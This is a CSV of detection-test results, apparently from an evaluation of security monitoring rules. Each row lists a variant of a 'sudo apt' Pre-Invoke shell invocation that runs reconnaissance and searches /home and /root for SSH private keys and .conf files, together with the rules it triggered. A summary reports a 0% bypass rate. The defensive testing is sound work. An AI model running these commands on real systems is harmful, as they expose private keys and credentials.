ID,Command,Log File,Result,All Detected Rules
147,"sudo apt -o ""APT::Update::Pre-Invoke::=logger whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack147.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
148,"sudo apt -o ""APT::Update::Pre-Invoke::=nohup whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack148.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion | Nohup Execution
149,"sudo apt -o ""APT::Update::Pre-Invoke::=timeout 1 whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack149.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
150,"sudo apt -o ""APT::Update::Pre-Invoke::=stdbuf -oL whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack150.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
151,"sudo apt -o ""APT::Update::Pre-Invoke::=script -q -c whoami /dev/null; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack151.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
152,"sudo apt -o ""APT::Update::Pre-Invoke::='head -c 0 /dev/null'; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack152.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
153,"sudo apt -o ""APT::Update::Pre-Invoke::=uname -n; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack153.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
154,"sudo apt -o ""APT::Update::Pre-Invoke::=lsb_release -a; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack154.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
155,"sudo apt -o ""APT::Update::Pre-Invoke::=true; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack155.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
156,"sudo apt -o ""APT::Update::Pre-Invoke::=echo 2130706433 | awk '{printf \""%d.%d.%d.%d\\n\"", ($1>>24)&255,($1>>16)&255,($1>>8)&255,$1&255}'; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack156.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
157,"sudo apt -o ""APT::Update::Pre-Invoke::=bash -c 'i=127;j=0;k=0;l=1; echo $i.$j.$k.$l'; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack157.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
158,"sudo apt -o ""APT::Update::Pre-Invoke::=ip a | grep inet; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack158.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | System Network Discovery - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
159,"sudo apt -o ""APT::Update::Pre-Invoke::=hostnamectl; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack159.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
160,"sudo apt -o ""APT::Update::Pre-Invoke::=env | grep USER; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack160.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
161,"sudo apt -o ""APT::Update::Pre-Invoke::=printenv USER; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack161.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
162,"sudo apt -o ""APT::Update::Pre-Invoke::=ps -p $$; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack162.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
163,"sudo apt -o ""APT::Update::Pre-Invoke::=who -m; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack163.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | System Network Connections Discovery - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
164,"sudo apt -o ""APT::Update::Pre-Invoke::=uptime; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack164.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | System Information Discovery | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
165,"sudo apt -o ""APT::Update::Pre-Invoke::=date; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack165.log,Trigger: Shell Invocation via Apt - Linux,Syslog Clearing or Removal Via System Utilities | Local System Accounts Discovery - Linux | Shell Invocation via Apt - Linux | File and Directory Discovery - Linux | Chmod Suspicious Directory | File Deletion
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: Detection Results),,,,
Total Meaningful Logs (Denominator),165,,,
Triggered Target (Detections),165,,,
Bypass Logs (Numerator),0,,,
BYPASS RATE (Bypass/Meaningful),0 / 165 (0.00%),,,
